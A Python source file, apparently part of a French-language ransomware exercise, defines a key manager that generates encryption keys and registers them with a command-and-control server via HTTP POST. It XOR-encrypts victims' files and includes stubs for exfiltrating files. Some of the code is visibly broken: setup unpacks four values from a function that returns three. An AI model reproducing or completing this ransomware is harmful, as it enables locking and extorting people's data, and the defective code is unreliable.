from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import time

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    # Dérive une clé à partir du sel et de la clé avec PBKDF2HMAC
    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        return kdf.derive(key)
        
    # Génère un sel, une clé privée, et dérive la clé sécurisée
    def create(self)->Tuple[bytes, bytes, bytes]:
        # Génération du sel aléatoire
        salt = secrets.token_bytes(self.SALT_LENGTH)
        # Génération de la clé privée aléatoire
        private_key = secrets.token_bytes(self.KEY_LENGTH)
        # Dérivation de la clé sécurisée à partir du sel et de la clé privée
        derived_key = self.do_derivation(salt, private_key)
        # Génération d'un token unique
        token = secrets.token_bytes(self.TOKEN_LENGTH)

        # Mise à jour des attributs internes
        self._salt = salt
        self._key = derived_key
        self._token = token

        return salt, private_key, token
        


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes, timestamp: int) -> None:
    # Prépare les données pour l'envoi au CNC, avec encodage en base64
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
            "timestamp": self.bin_to_b64(timestamp.to_bytes(4, 'big'))  # Encodage du timestamp
        }
        url = f"http://{self._remote_host_port}/new"
        response = requests.post(url, json=data)

        # Log le résultat de la requête
        if response.status_code == 200:
            self._log.info("Les données ont été envoyées au CNC avec succès.")
        else:
            self._log.error(f"Échec de l'envoi des données au CNC : {response.text}")


    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        # Vérification de la connexion au CNC
        try:
            url = f"http://{self._remote_host_port}/ping"
            response = requests.get(url)
            if response.status_code != 200:
                self._log.error("CNC est injoignable.")
                raise ConnectionError("CNC is unreachable")
        except requests.RequestException as e:
            self._log.error(f"Erreur de connexion au CNC : {e}")
            raise e

        # Vérifie l'existence des fichiers _token.bin et _salt.bin pour éviter de les écraser
        token_path = os.path.join(self._path, "_token.bin")
        salt_path = os.path.join(self._path, "_salt.bin")
        timestamp_path = os.path.join(self._path, "_timestamp.bin")

        if os.path.exists(token_path):
            self._log.warning("Un fichier _token.bin existe déjà. Annulation de la configuration pour éviter de l'écraser.")
            raise FileExistsError("A _token.bin file already exists. Cancelling setup.")

        # Création des éléments cryptographiques
        self._salt, self._key, self._token, self.timestamp = self.create()

        # Création du répertoire cible si nécessaire
        os.makedirs(self._path, exist_ok=True)

        # Sauvegarde locale des éléments cryptographiques
        with open(salt_path, "wb") as salt_file:
            salt_file.write(self._salt)
        with open(token_path, "wb") as token_file:
            token_file.write(self._token)
        with open(timestamp_path, "wb") as timestamp_file:
            timestamp_file.write(self.timestamp)

        # Envoi des éléments cryptographiques au CNC
        self.post_new(self._salt, self._key, self._token, self.timestamp)
        self._log.info("Configuration terminée : éléments cryptographiques créés, sauvegardés et envoyés au CNC.")
        

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        if self._token is None:
            self._log.error("Le token n'a pas été généré.")
            raise ValueError("Le token n'est pas défini.")
            
        token_hash = sha256(self._token).hexdigest()
        self._log.info(f"Token haché en hexadécimal: {token_hash}")
        return token_hash
        

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file_path in files:
            try:
                xorfile(file_path, self._key)
                self._log.info(f"Fichier {file_path} chiffré/déchiffré avec succès.")
            except Exception as e:
                self._log.error(f"Erreur lors du chiffrement/déchiffrement du fichier {file_path}: {e}")
            

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()